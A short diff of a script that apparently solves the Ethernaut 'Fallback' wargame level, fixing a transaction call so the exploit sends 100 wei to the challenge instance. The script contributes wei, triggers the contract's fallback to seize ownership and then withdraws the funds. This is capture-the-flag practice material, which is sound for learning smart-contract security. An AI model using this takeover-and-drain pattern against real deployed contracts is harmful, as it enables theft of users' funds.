@@ -14,7 +14,7 @@ https://solidity-05.ethernaut.openzeppelin.com/level/0xD95B091f19946d6ef0c88f8CD
     console.log('Contribute 100 wei...')
     await victim.methods.contribute().send({ value: 100 })
     console.log('Send 100 wei to fallback...')
-    await web3.eth.sendTransaction({ value: 100 })
+    await web3.eth.sendTransaction({ to: instance, value: 100 })
     console.log('withdraw funds...')
     await victim.methods.withdraw().send()
     console.log('Done. You can submit your instance in the browser.')
